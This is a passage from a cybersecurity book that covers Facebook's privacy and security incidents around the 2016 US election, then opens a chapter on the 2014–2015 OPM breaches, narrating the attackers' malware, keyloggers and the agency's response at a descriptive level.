attack exemplified that attackers could easily break into an  organization without having to compromise heavily guarded back-end  servers in the organization’s data center, but steal significant amounts of  intellectual property by taking advantage of vulnerabilities on endpoints— laptops, desktops, and mobile phones—as the entry points for their attack.  Although organized cybercriminals were behind the zero-day watering hole  attack, it showed that the highest of the high-tech companies were quite  susceptible to not only sophisticated organized cybercriminals but could be  expected to be vulnerable to nation-state attackers just as well.   Download More Than Just Your Information Later that year in June 2013, Facebook suffered another breach that  impacted personal information of approximately 6 million users. Facebook  allowed users to upload all their contacts  e.g., from their mobile phones   to help automatically find friends and make connections with them.  However, the contacts uploaded should only have been used for the  purpose of helping make connections.  4 Meet the hackers who break into Microsoft and Apple to steal insider info,  https:  arstechnica.com information-technology 2015 07 meet-the- hackers-who-break-into-microsoft-and-apple-to-steal-insider-info   108   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  In Facebook’s Download Your Information feature, when users  downloaded information about their friends, it may have included  friend data and contact phone numbers from uploaded mobile phone  address books that should not have been revealed in the download  but  should only have been used for helping make connections . As many of  the names and phone numbers that were uploaded by Facebook users  were for people that did not even have Facebook profiles, but Facebook  now effectively had PII for them, such people were said to have “shadow  profiles” on Facebook. Such people were not users of Facebook and  never agreed to Facebook’s terms and conditions, yet had their personal  information shared without their permission.   From Breaking Things to Fixing Things As Facebook continued becoming a larger and larger company, there  were multiple instances in which management saw that their speed of  getting new products and features to market needed to be tempered.  Although “moving fast and breaking things” was probably reasonable for  a startup company, Facebook management started realizing that as the  company had more at stake, there was also more to lose when they “broke  something.” In April 2014, Facebook changed the “move fast and break  things” motto to “move fast with stable infra” and announced the change  at its F8 Developer’s conference.  We used to have this famous mantra … and the idea here is  that  as  developers,  moving  quickly  is  so  important  that  we  were  even  willing  to  tolerate  a  few  bugs  in  order  to  do  it  …  What we realized over time is that it wasn't helping us to move  faster because we had to slow down to fix these bugs and it  wasn't improving our speed.  —Mark Zuckerberg, CEO, Facebook, 2014  109   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  “In the past we’ve done more stuff to just ship things quickly  and  see  what  happens  in  the  market...Now,  instead  of  just  throwing  something  out  there,  we’re  making  sure  that  we’re  getting it right first.”  —Brian Boland, VP of Product Ads at Facebook, 2014  Hence, the approach was still to “move fast” but to do so with “stable  infrastructure.” The new motto mostly applied to functionality-oriented  software bugs. Facebook Beacon in 2007 and the “birthdate bug” in 2008  were examples of the old adage of “haste creates waste.”  Following the motto change, Facebook made changes in April   2015 that cut off Facebook apps from taking any and all data that they  wanted from friends. Further changes were made in April 2018 that  eliminated application developers from being able to access fields such as  relationship status, religion, and education from a user’s profile even when  users installed applications. However, before those changes were made,  the trust that Facebook gave to application developers was abused by some  companies and nation-states.   Russian Disinformation As early as 2014, Russia’s Internet Research Agency  IRA  and  other agencies engaged in abuse of Facebook’s platform to mount  disinformation campaigns. The Russians had been mounting  disinformation campaigns for decades via print and radio. Many of their  early disinformation campaigns were targeted at Western Europe, with the  United States becoming aware of Russian disinformation campaigns in  the 1980s with the discovery of a fake document claiming that the United  States supported apartheid.  110   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  The English word disinformation itself comes from the Russian  дезинформация, transliterated as dezinformatsiya. The very word  dezinformatsiya inherently seeks to spread disinformation regarding its  own origin. The Russian word was supposedly coined by Joseph Stalin  himself in 1923 together with the creation of a “special disinformation  office” and coined in such a way to sound French such that he could pin  the concept on the French. Disinformation is false information, often  issued by a government, specifically by an intelligence agency, and often  under guise. Social media platforms just happen to be the latest tools that  have been abused to spread disinformation. The scale of social media  platforms like Facebook and speed at which they could potentially be  used to spread disinformation is what makes them most significant as  compared to print, radio, television, or the Web prior to the advent of  social networking.   Social media platforms have also probably been the most effective   tool in history to date that has been able to help governments spread  disinformation. Social media platforms allow their legitimate users to  instantly share information virally with all of their followers and friends  and transitively allow followers and friends to do the same. Such platforms  were used to virally spread disinformation leading up to the 2016 US  presidential election. Social media platforms increasingly took action  afterwards to annotate posts and tweets in the years following.  Post the  2020 US presidential election, Donald Trump was banned from using  Twitter and Facebook amidst fears of disinformation about the election  being fraudulently stolen  despite a lack of evidence , and concerns the  platforms could be used to incite violence.  111   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  As compared to the term disinformation, which is typically   used to refer to false information spread with malicious intent, the  term misinformation is used to refer to false information spread  inadvertently. A government, or agents working indirectly for a  government, may set up fake social media accounts to spread  disinformation  such that they can deny that they are the true source .  Once tweets or posts with disinformation are retweeted and reposted by  others, the accounts from which the retweets or secondary posts occur  are often said to be spreading misinformation, as the secondary posts  may be propagating the false information inadvertently and without  explicit malicious intent.  Such disinformation campaigns were part of larger “active measures”   that Russian security services engaged in with the intention of  influencing the course of international affairs. IRA’s employees created  fictitious US personas that were supposedly US activists working for or  with both fictitious and real organizations. With regard to the United  States specifically, the IRA did not attempt to just propagate information  on one social media platform or another. These personas would create  multiple accounts on the various social media platforms, including  not only Facebook but also Twitter, YouTube, Instagram  owned by  Facebook , Reddit, and Pinterest, among other social media sites.  Additional aspects of Russia’s “active measures” included organizing  political rallies within the United States to sow discord in American  politics and create divisions.  In Robert Mueller’s Special Counsel report issued in 2019 after a  significant investigation, it was found that “The Russian government  interfered in the 2016 presidential election in sweeping and systematic  fashion.” A subsequent Intelligence Community Assessment  ICA   concluded the following:  112   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  Russian President Vladimir Putin ordered an influence cam- paign in 2016 aimed at the US presidential election. Russia’s  goals  were  to  undermine  public  faith  in  the  US  democratic  process, denigrate Secretary Clinton, and harm her electabil- ity and potential presidency.  —Assessing Russian Activities and Intentions in Recent   US Elections, ICA 2017-01D, January 6, 20175  The Russian outreach on social media and blogs took place primarily  via the creation of “organic” accounts and content, as opposed to buying  ads, but the IRA did also purchase ads. Over 126 million Americans were  exposed to the organic content produced by the IRA. Over 80,000 pieces  of organic content were created on over 470 IRA-created Facebook pages.  Over 3500 advertisements were run under a budget of at least $100,000,  and over 11.4 million Americans were exposed to the advertisements.  Figures 5-4 through 5-6 are just a few examples of anti-Clinton   Facebook ads that were purchased in Russian rubles. Table 5-2 shows how  many ad impressions and clicks some of the example ads received and  how much budget was spent on the ads.  Table 5-2.

The Facebook ad in Figure 5-7 is  another such example.  116   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  Figure 5-7.  Ad targeted at fueling racial divisions  Overall, the Intelligence Community Assessment  ICA  summed up   quite well the use of social media disinformation campaigns as part of  Russia’s active measures:  Moscow’s influence campaign followed a Russian messaging  strategy  that  blends  covert  intelligence  operations—such  as  cyber  activity—with  overt  efforts  by  Russian  Government  agencies, state-funded media, third-party intermediaries, and  paid social media users or “trolls.”  —Assessing Russian Activities and Intentions in Recent   US Elections, ICA 2017-01D, January 6, 20176  Nevertheless, while the amount of impact that Russian interference  had on the election may be debatable, it was the first time in history in  which the Russians so overtly had some level of interference in a US  election via social media.  6 www.dni.gov files documents ICA_2017_01.pdf  117   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion   Cambridge Analytica Abuse of Facebook Facebook’s platform was not only abused by the Russians but was also  abused by the Trump campaign through Cambridge Analytica. Note that the  Trump presidential campaign was a client of Cambridge Analytica, a data  science firm that leveraged “scraped” Facebook profiles of tens of millions  of Americans. Cambridge Analytica built up psychographic profiles of  voters to influence “persuadable,” undecided voters in critical locations that  could turn the electoral votes of certain states in favor of their clients. The  Americans whose profile information was “scraped” had their data used  without their knowledge, approval, or opt-in. Media coverage on Cambridge  Analytica in 2018 focused most of its fire on the abuse of the Facebook  platform, but we specifically mention the Trump presidential campaign’s  use and abuse of Facebook in addition to Cambridge Analytica as Steve  Bannon was both the chief executive of Trump’s presidential campaign  team and a co-founder and vice president at Cambridge Analytica.  Cambridge Analytica acquired its data on voters via a personality   survey application called “thisisyourdigitallife” built by Aleksandr  Kogan, a University of Cambridge researcher, who was doing research on  psychometrics. Cambridge Analytica paid Kogan $800,000 for his work,  research, and data. Cambridge Analytica paid 270,000 users $1 to $2 each  to install the application via Amazon’s Mechanical Turk program and take  the survey. The value for Cambridge Analytica in doing so was not getting  answers to the quiz questions or conducting personality tests on the  relatively small number of users that installed the application, but rather  in abusing Facebook’s APIs to gather lists of all their friends, their names,  dates of birth, locations, and lists of every Facebook page they liked. As  each user on Facebook had many other friends, data on up to 87 million  users were aggregated.7 Such information was valuable in understanding  the locations and predispositions of each of those users.  7 https:  about.fb.com news 2018 04 restricting-data-access   118   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  The “thisisyourdigitallife” app did have a terms of service, excerpts of   which are shown as follows: [bold emphasis added is our own]    1.  …    2.

The Trump campaign had also assembled a much larger data set of   users via Project Alamo, which not only referred to an identity database of  over 220 million users that the campaign had assembled but also referred  to the larger initiative that spent tens of millions of dollars or more on  Facebook ads to influence voters. The project was named after its center  for digital operations in San Antonio, Texas, which was also the location of  the Battle of the Alamo in 1836.  Trump’s digital operations had three key goals via Facebook ads:    1   Raise funds for the Trump campaign. When a   Facebook user made a small donation in response  to a Facebook ad, the user would then be further  contacted by email or by phone to make a larger  contribution.    2   Encourage pro-Trump voters to come to the polls.  121   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion    3   Suppress anti-Trump voters from coming to the  polls. Steve Bannon and his team used Facebook  ads aimed at idealistic white liberals, young women,  and African Americans to encourage them not to  come to the polls, as they would be more likely to  vote for Clinton.  Project Alamo, in and of itself, leveraged digital marketing techniques   and acquired a large part of its data on voters from the Republican  National Committee. Such techniques were not an abuse of Facebook, but  rather used it as the extremely effective legitimate advertising engine that  it has become. Cambridge Analytica’s services were also part of Trump’s  overall digital advertising campaign, and that part of the campaign did  abuse Facebook as improperly and inappropriately acquired friends data  from the thisisyourdigitallife application was used.  So although the Russians did interfere with the election via multiple   social media platforms  including Facebook , it is also clear that the Trump  campaign very effectively leveraged Facebook ads to not only raise funds  but to influence persuadable voters in swing states. The election came  down to 77,744 votes in three swing states—Pennsylvania, Wisconsin,  and Michigan. Cambridge Analytica’s lead data scientist had advised  Trump’s campaign to focus on rural voters in Pennsylvania, Michigan, and  Florida—of the three states, Pennsylvania and Michigan were swing states  which helped decide the election. Table 5-3 shows the number of users in  swing states whose profile and friends data was improperly shared with  Cambridge Analytica.   122   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  Table 5-3.

The  data was gathered and stored on servers that Facebook did not control.  Although Facebook had directed Cambridge Analytica to delete the data  at the time, it appears that Cambridge Analytica did not fully comply, and  reports surfaced in 2018 that the gathered data was still in existence.  When  we  first  contacted  Cambridge  Analytica,  they  told  us  that they had deleted the data. About a month ago, we heard  new reports that suggested that wasn’t true. And, now, we're  working with governments in the U.S., the U.K. and around  the world to do a full audit of what they've done and to make  sure they get rid of any data they may still have.  —Mark Zuckerberg, Senate Transcript, 2018  Although Facebook has experienced several traditional data   breaches, the abuses of Facebook’s social media platform in connection  with elections and disinformation campaigns were not data breaches.   9 https:  about.fb.com wp-content uploads 2018 05 state-by-state- breakdown.pdf  123   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  Cambridge Analytica’s abuse of Facebook was not a data breach as per  the legal definition of “data breach” as consumer PII data was not “stolen”  from Facebook by an unauthorized hacker, and there was no trigger of  notification requirements under state breach notification laws. Rather,  it was a case in which a third-party application developer on Facebook’s  platform stored data that they were not supposed to, abusing Facebook’s  API and operating in violation of their agreement with Facebook.  Facebook would go on to have additional data breaches, as per the   legal and formal definition of data breach. In September 2018, Facebook’s  monitoring systems identified an anomalous traffic pattern in a privacy  feature that Facebook offered for users to see what their profiles looked  like when viewed by the public. A sophisticated attacker took advantage  of three vulnerabilities in Facebook’s site to not just view profiles using  the feature but also steal access tokens that allowed for both unauthorized  read and write access to Facebook profiles. Facebook explained how the  three vulnerabilities came together to result in the breach in the following  excerpt from a Facebook Security blog post:10  First: View As is a privacy feature that lets people  see what their own profile looks like to someone  else. View As should be a view-only interface.  However, for one type of composer  the box that  lets you post content to Facebook  — specifically  the version that enables people to wish their friends  happy birthday — View As incorrectly provided the  opportunity to post a video.  Second: A new version of our video uploader  the  interface that would be presented as a result of  the first bug , introduced in July 2017, incorrectly  generated an access token that had the permissions  of the Facebook mobile app.  10 https:  about.fb.com news 2018 09 security-update   124   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  Third: When the video uploader appeared as part  of View As, it generated the access token not for  you as the viewer, but for the user whom you were  looking up.  It was the combination of these three bugs that  became a vulnerability: when using the View As  feature to view your profile as a friend, the code did  not remove the composer that lets people wish you  happy birthday; the video uploader would generate  an access token when it shouldn’t have; and when  the access token was generated, it was not for you  but the person being looked up. That access token  was then available in the HTML of the page, which  the attackers were able to extract and exploit to log  in as another user.  Facebook almost immediately disabled the “View As…” feature on   their site once the anomalous activity on its site was internally detected  and reset 90 million access tokens—50 million accounts of which they  believed were directly affected and another 40 million that exercised the  “View As…” feature. Facebook stated that they did not know who may have  found or exploited the vulnerabilities, but issuing an access token reset for  90 million users is not something that social media companies take lightly.  Users are logged out when an access token reset takes place, and as many  users do not remember their passwords, logging back in is a pain in the  neck. Facebook deprived itself of advertising revenue from all the page  views they would have otherwise received had they not had to log out 90  million of their users.  Some of the users may also never come back and  log in again.   It is overall somewhat ironic that a set of vulnerabilities relating to a  feature that Facebook offered to support user privacy in part resulted in  such a large data breach. It is also interesting that this breach took place   125   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  after Facebook locked down its access to friends data and some profile  data in the aftermath of the Cambridge Analytica incident. Whereas a  determined party that wanted such data could have previously obtained  it via developing a third-party application and storing the data against  Facebook’s terms of service, the only option to acquire such data post  Facebook’s lockdown of the APIs may have been to more directly attack the  site as such to achieve the same goal.  Upon further investigation, Facebook found that the number of actual  users who had access tokens stolen was approximately 30 million. For 15  million of those, name and contact information  e.g., phone number  were  accessed with the access tokens. For another 14 million, many more fields  were stolen including username, gender, locale language, relationship  status, religion, hometown, self-reported current city, birthdate, device  types used to access Facebook, education, work, the last 10 places they  checked into or were tagged in, website, people or pages they follow, and  the 15 most recent searches.  For the remaining 1 million, only the access  tokens were stolen.    Passwords in the Clear In March 2019, Facebook revealed that it internally and inadvertently  stored plaintext passwords for hundreds of millions of its users “in the  clear” in a fashion that they could be searched by any of 20,000 employees.  Passwords should not be stored in cleartext but rather only in a fashion  where they can be checked but not be directly viewable or “decrypted.”  In Chapter 9 of my  Neil’s  Foundations of Security book, I detail best  practices on how to store passwords. Facebook investigated and found that  employees had not inappropriately accessed the passwords. Both Twitter  and GitHub also revealed similar issues regarding storing passwords in  the clear the year prior in 2018. Software developers often log data to help  them troubleshoot and debug problems when they occur. However, it is  important not to log sensitive data such as passwords in the clear.  126   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion   More Mass Profile Exposure The final type of security incident relevant to Facebook data we will  comment on in this chapter is the one in which stolen Facebook data  appeared exposed on the Internet and or on the dark web. In April 2019,  for instance, a researcher at security company UpGuard found that  Facebook data on 540 million users collected by third-party companies  were exposed on Amazon servers. A Mexico-based online media  platform by the name of Cultura Colectiva had stored user account  names, Facebook IDs, comments, likes, reactions, and other data used  for analyzing social media feeds and user interactions on their servers.  Facebook directed Amazon to take down the data. The data was likely  gathered in violation of Facebook’s terms of service for third-party  developers, similar to the case of the thisisyourdigitallife application, prior  to Facebook restricting developer’s ability to access data in 2015. However,  the amount of data was even more significant at 540 million, as compared  to the 87 million user profiles accessed by Cambridge Analytica.   FTC Fines Facebook Five Billion Dollars In July 2019, the Federal Trade Commission fined Facebook in the amount  of $5 billion for violations of the consent decree under which the company  had been placed years prior—in particular that Facebook privacy settings  failed to disclose that friend data would be shared by default with third-  party application developers, among other issues. The $5 billion penalty  was the largest fine of its kind. The FTC website announcing the penalty  stated that the fine was “almost 20 times greater than the largest privacy  or data security penalty ever imposed worldwide, and one of the largest  penalties ever assessed by the U.S. government for any violation.” Figure 5- 8  shows the relative size of the penalty against previously issued privacy-  related penalties. Penalties of $275 million issued against Equifax by the   127   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  Consumer Financial Protection Bureau  CFPB  and $148 million against  Uber by US states were much smaller in comparison. In addition, the next  largest penalty issued by the FTC itself was against LifeLock in the amount  of $100 million a few years prior.  Figure 5-8.  Highest penalties in privacy enforcement actions    Source: FTC   On the same day that the $5 billion penalty was issued, the FTC also  issued a complaint against Cambridge Analytica. It is interesting to note  that although the transgression of user privacy was done by Cambridge  Analytica which was a third party to Facebook, Facebook was held  financially accountable. One of the many lessons to be learned is that Big  Tech can be held very accountable for its third parties’ direct behaviors.   Profiles for Sale on the Dark Web Later in December 2019, an additional data store of 267 million Facebook  user profiles was indexed by search engines and found by Comparitech  researcher Bob Diachenko. In March 2020, the same 267 million user data  store was found on a publicly exposed Elasticsearch server along with   128   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  another 42 million record data set for a total of 309 million records. In  April 2020, the 309 million record data set was sold on the dark web for 500  UK pounds, or about $540 USD at $0.0002 cents per record. The records  contained user account names, Facebook IDs, comments, likes, reactions,  and other data used for analyzing social media feeds and user interactions.  It is interesting that although such large amount of such sensitive data can  be used for nefarious purposes, the raw data itself is so inexpensive on the  dark web.   Summary Facebook has resolved many privacy and security issues over the years  to  the extent that such issues can be resolved after the fact . The key lessons  from the ten Facebook incidents that we have covered in this chapter are:    1.  Do not trust third parties without mechanisms   in place to monitor verify their behavior and  enforce security policies, through technical and  administrative countermeasures.    2.  Emphasize security and privacy design early as well   as testing of implementation to avoid first-party  software flaws and bugs. As software becomes more  widely adopted, the impact and cost of security and  privacy issues can be amplified at a pace faster than  the adoption itself.    3.  Require user opt-in prior to sharing their data and  implement their privacy preferences as both users  and regulators would expect.  129   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  Given Facebook’s scale and the nature of its service, it has been abused   by third-party developers and companies such as Cambridge Analytica.  In addition to abuses of its platform, Facebook has also suffered data  breaches and a variety of security and privacy incidents. Facebook’s  initial focus on speed-to-market, flexibility, and trust in its developers  have resulted in significant ramifications to the world and to the company  financially.  130   CHAPTER 6  The OPM Breaches  of 2014 and 2015  We cannot undo this damage. What is done is done and it will  take decades to fix.  —John Schindler, former NSA officer1  In 2015, the Office of Personnel Management  OPM , the chief  human resources agency for the federal government, announced a  breach that exposed the SF-86 security clearance background checks of  over 21.5 million US government employees, the fingerprint data of 5.6  million individuals, and personnel files of 4.2 million current and former  government employees. The stolen SF-86 forms included information  on millions of government employees, including SSNs; the names and  addresses of family members, neighbors, and friends; extensive personal  financial information; psychological evaluations; and the usernames and  passwords of background investigation applicants. As described by former  FBI Director James Comey and former CIA Director Michael Hayden,  the stolen data was a “treasure trove” of data so sensitive that it could be   1 The OPM Data Breach: How the Government Jeopardized Our National   Security for More Than a Generation, September 2016, https:  republicans-  oversight.house.gov report opm-data-breach-government-jeopardized-  national-security-generation     Neil Daswani and Moudy Elbayadi 2021  N.

The haunting effects of this blow to  national security will never be known in full to the United States.  OPM referred to itself as the “chief human resources agency and   personal policy manager for the Federal Government.”2 OPM provided  and stored information on employees of over 100 US federal agencies and  held valuable personnel records that caused an immeasurable amount of  damage when stolen. Prior to the 2015 and 2014 breaches, OPM was met  with several federal security audits. All of these audits made OPM aware  that the agency was very susceptible to a massive data breach and OPM  needed to prioritize and invest in its security to mitigate advanced and  emerging cyberthreats. However, the agency leadership had not acted  aggressively enough to resolve the vulnerabilities exposed in the audits.  The agency was only spending $7 million annually on its information  security, about ten times less than even the Department of Agriculture.   A lack of prioritization of security, leadership and investment issues,  missing countermeasures  such as two-factor authentication , and  insufficient anti-malware tools set OPM’s data breaches apart from others  of its kind. Donna Seymour and Katherine Archuleta, the CIO and agency  director of OPM, respectively, resigned.  After World War I, Georges Clemenceau critiqued that gener- als are always preparing for the last war rather than the next  one. Cybersecurity reform needs to prepare agencies like OPM  to  face  current  and  future  threats  rather  than  defending  against retired attack models.  —Institute for Critical Infrastructure Technology  2 www.performance.gov OPM :~:text=Overview,they%20serve%20the%20 American% 20people  132   Chapter 6    the OpM BreaChes Of 2014 and 2015  The OPM breaches were carried out in two waves. In this chapter,  we will discuss the methods the hacker groups used to breach OPM’s  databases as well as OPM’s response to both the 2014 and 2015 breach.  The key lessons learned from the OPM breaches are summarized to  provide general and useful security tips that can be used to secure any  organization.   State-Sponsored Chinese Attackers Axiom and Deep Panda, two China-backed hacker organizations, are  suspected to be the groups that carried the two major waves of the OPM  breaches. The first attacker, referred to as X1 by OPM, has been unofficially  confirmed as the Axiom group. The second attacker, X2, or Deep Panda,  is a Chinese threat group that also played integral roles in attacks against  other US interests, such as healthcare provider Anthem and airline  company United Airlines. Due to the circumstantial evidence that points  to Axiom being the first hacker and Deep Panda being the second, the  hackers for the rest of the chapter will be referred to as X1 and X2.  X1 and X2 are highly suspected to have strategically coordinated their  attacks on OPM. X1 and X2 likely used a common supplier for resources,  such as a “shared malware building tool,” as referred to by intelligence  from security firm FireEye. Both X1 and X2 were found to have used Hikit  malware, which has been linked to the Elderwood Framework, a library  of exploits found to be used by Deep Panda and Axiom in the past. The  connection between the two hackers was made because in 2014, X2 had  dropped PlugX malware onto the databases that X1 had been targeting  at the time. After dropping PlugX malware, X2 was able to gain access to  personnel records and other background information in just 45 days. The  time between X2’s entry to its exfiltration of data was very short, compared  to the almost 18 months that X1 was probing OPM’s network.  133   Chapter 6    the OpM BreaChes Of 2014 and 2015  X2 has also been suspected of breaching healthcare provider Anthem.  Similarities in the tools used between the OPM and the Anthem breaches  make it likely that X2 was involved in the attack on OPM. For instance,  investigators found that the malicious X2 domain opm-learning.org was  used during both the OPM and Anthem breaches.   The Breaches: An Overview and Timeline Within the first 18 months of infiltrating OPM’s network, the first hacker  group, X1, exfiltrated technical manuals and documentation that  outlined OPM’s network architecture in detail. The information stolen  by X1 included who had access to key systems such as PIPS, Personnel  Investigations Processing Systems, as well as the Fingerprint Transaction  System.  The second hacker, X2, was suspected of taking advantage of X1’s   knowledge gathering and other stolen documentation. Using the  intelligence in the stolen documentation, X2 exfiltrated SF-86 background  information, personally identifiable identity information, and fingerprint  data. As part of the OPM breach, X2 also targeted OPM contractor  KeyPoint Government Solutions. KeyPoint Government Solutions  provided background investigations and employee screening procedures  for OPM, which made the information KeyPoint possessed extremely  valuable.  Figure 6-1 shows a timeline of the major events of both breaches that  led to X2 eventually stealing millions of records from both OPM and the  Department of Interior. The attackers exposed many important pieces  of PII that were compromised in other breaches as well, such as the   134   Chapter 6    the OpM BreaChes Of 2014 and 2015  Ashley Madison Breach, and gave adversaries the ability to further exploit  government employees.  A foreign spy agency now has the ability to cross-check who  has a security clearance, via the OPM breach, with who was  cheating  on  their  wife  via  the  Ashley  Madison  breach,  and  thus identify someone to target for blackmail.  —Peter W. Singer, LA Times  Figure 6-1.  A timeline of the major events before, during, and after  the 2014 and 2015 OPM breaches   The US Government Warns OPM In July 2005, the US Computer Emergency Response Team  US-CERT   alerted OPM that hackers were attempting to exfiltrate information from  the federal government through spear phishing emails. The 2005 warning  was meant to alert OPM to advanced persistent threat  APT  attacks, in  which the adversary’s goal is to steal very valuable information over time,   135   Chapter 6    the OpM BreaChes Of 2014 and 2015  sometimes even years. APT attacks often used advanced and customized  malware that was not detected by anti-virus software. Attackers continued  to carry out APT attacks against the federal government for over a decade.  Following the APT notification from the US-CERT, OPM failed   multiple security audits and was made aware of its long list of security  vulnerabilities. In 2012, 37 user IDs and passwords were stolen by an  attacker, @k0detec, who was suspected to be associated with the hacking  group Anonymous. OPM tried to take steps following the 2012 attack  to improve IT security but did not make much progress. Although most  organizations do not have a fully complete inventory of all their systems,  OPM did not even have an inventory list of the most critical systems the  agency was running!  As demonstrated, the cybersecurity failures that OPM witnessed were   built upon over time as OPM learned the importance of proper security  protocols as attacks occurred not only at OPM but also at the Department  of Homeland Security. The breaches conducted by X1 and X2 were not  the only incidents where vulnerabilities were exposed. Prior to the attacks  carried out by X1 and X2, there were various security issues regarding  OPM’s databases that made OPM aware of their lack of sufficient security  protocols, tools, and detection systems.  In 2014, 11 of 21 critical systems at OPM were running without ATOs,   or Authorizations to Operate,3 and many contained highly valuable  information. The Inspector General warned OPM that the agency was  struggling to meet FISMA  the Federal Information Security Management  Act  requirements. OPM’s lack of compliance pushed the Inspector  General to recommend OPM to shut down systems that lacked an  ATO. Shutting down the systems, as recommended, until OPM remediated   3 An Authorization to Operate, or ATO, is granted to a federal agency after the  agency is audited for compliance with federal standards. In the case of OPM, this  standard would be the FISMA  the Federal Information Security Management  Act .  136   Chapter 6    the OpM BreaChes Of 2014 and 2015  known issues would have likely prevented the breach, although doing  so would have been disruptive. Donna Seymour, CIO of OPM, however,  responded by saying IT managers would fix the issue of a lack of ATOs  promptly to ensure organizational security. Three of the eleven OPM  systems operating without ATOs should have been addressed immediately  by OPM. These included the PIPS  Personnel Investigations Processing  System , ESI  Enterprise Server Infrastructure , and the Local Area  Network and Wide Area Network  LAN WAN . PIPS, the main system  that stored valuable background information data, relied on both ESI  and LAN WAN networks in order to maintain its data flow, and the lack  of recognition of the importance of keeping PIPS secure made OPM  vulnerable.   X1: OPM Is Under Attack On March 20, 2014, OPM received a notification from the US-CERT  that data were being exfiltrated from OPM databases. Following this  notification, OPM began to monitor its systems more aggressively.  Through the investigation of audit logs and OPM’s prevention systems,  the US-CERT found gaps in the logging of OPM’s security events. Further  investigation led the US-CERT to notify OPM that a third party had noticed  OPM data being exfiltrated and sent to a C2  command and control   server. A C2 is a central server, run by an attacker, that allows the attacker  to control machines infected with malware. Once hackers compromise  a machine, malware connects the compromised machine to a C2 server.  From there, the attackers can send commands of their choice to the  compromised machines. The communication between the C2 server  and OPM server was encrypted. However, OPM was able to observe the  communications between infected machines and the C2 server by creating  a custom script using network traffic information to duplicate the hidden  algorithm the attackers were using to hide their activity from OPM’s   137   Chapter 6    the OpM BreaChes Of 2014 and 2015  sensor-based security tools. Examination of the network traffic between  the C2 server and infected machines showed that attackers were looking  to attain files related to the PIPS system on OPM’s network. OPM was  able to analyze the network traffic between the C2 server and its network,  leading OPM to detect the types of malware installed on the OPM devices  communicating with the C2 server.  The method of entry that X1 used is unknown due to incomplete audit  logs that not only delayed OPM’s discovery of the breach but also made it  difficult to find the attacker’s point of entry. What followed the discovery of  X1 was a three-month incident response effort carried out by OPM in which  it notified the US-CERT to monitor endpoints4 and improve tracking of  the attacker. Through implementation of CylanceV, an endpoint detection  product by US security firm Cylance, US-CERT was able to identify the  communication occurring between the C2 server and OPM server.  PIPS stored all the SF-86 forms. OPM was operating PIPS  and other  systems  without a current valid ATO. Prior to the X1 attack, OPM did not  monitor the information flow to and from PIPS but was able to monitor  information flow with the implementation of a fiber tap.5 While monitoring  PIPS, OPM found that X1 used malware such as Hikit, a form of kernel- level malware capable of keylogging, in OPM systems.   X1: Malware and Keylogging X1 installed keystroke logging malware with administrator privileges onto  OPM database machines. After X1 had acquired administrator privileges,  OPM decided to finally put anti-malware countermeasures in blocking  mode, which are discussed in detail later in this chapter.  4 Machine or host that could be infected: e.g., laptop, desktop server. 5 For a wired network using fiber optics, a fiber tap records everything transferred  on the wires.  138   Chapter 6    the OpM BreaChes Of 2014 and 2015  Keystroke logging  keylogger  malware records keystrokes made by  users, including any passwords that they type. Keyloggers can collect all  keystrokes and send them to the attacker's C2 server. There are many  different types of keylogging. Some keyloggers collect information typed  into a particular website or application, while other keyloggers record  every single keystroke a user makes on a given machine. The X1 attackers  installed keyloggers onto multiple database administrator’s workstations  in order to exfiltrate valuable information from OPM databases. A lack of  two-factor authentication made it easier than otherwise for attackers to  gain control of legitimate accounts to both install keyloggers and capture  additional account credentials once the keyloggers were installed. The  discovery of the installation of keylogging malware was the point at which  OPM decided it had to take action since X1 was getting dangerously close  to PIPS.   Kicking Out X1: The Big Bang When attackers have compromised systems, and they need to be kicked  out, it is vital to do so in a manner in which the attackers are removed  immediately across all systems. This way, the attackers do not get any upfront  warning or the opportunity to exfiltrate data once it is clear that they are in  the process of being removed. OPM termed their version of such an approach  a “Big Bang.” Of course, if attackers are in control of even one system that  defenders are unaware of, then the attackers may be able to exfiltrate data  from that system once they are kicked out of other compromised systems. OPM was focused on X1 in their “Big Bang” response, as X1 was the  only attacker group OPM believed to have compromised their network.  OPM was unaware that X2 had also compromised their network. OPM shut  down the keylogging software and engaged Cylance to deploy their anti-  malware software. Cylance was eager to have some of its products tested  out in order to counter the effects of X1’s breach.  139   Chapter 6    the OpM BreaChes Of 2014 and 2015  As OPM was a federal agency, it is by law required to meet a certain set   of security requirements. For example, FISMA  the Federal Information  Security Management Act  passed in 2002 and the Federal Information  Security Modernization Act passed in 2014 require all federal agencies to  implement preventative information security controls and require annual  audits of their systems. OPM’s annual audits highlighted the agency’s  security shortcomings. Auditors made OPM aware of its vulnerabilities,  but OPM did not heed these warnings aggressively enough. OPM lacked  basic security controls, such as multi-factor authentication, despite various  warnings from inspectors.  As OPM was performing its Big Bang on X1, OPM felt that it had the  X1 breach under control, but was still unaware of X2, which had already  begun to infiltrate the OPM network.   X2: A Devastating Blow to US Intelligence As OPM and US-CERT were monitoring X1’s intrusive activity during May  2014, X2 established a foothold in OPM’s network. Once into the network,  X2 moved through OPM’s network, ultimately exfiltrating the highly  sensitive data that X1 was originally looking for.  On May 7, 2014, X2 logged in to an OPM Microsoft SQL server using a   virtual private network  VPN .6 X2 used the network credentials of an OPM  contractor, an employee of KeyPoint, to do so. It is unclear how X2 gained  access to KeyPoint credentials because of a lack of forensic evidence. The  stolen KeyPoint credentials did not have administrative access so hackers  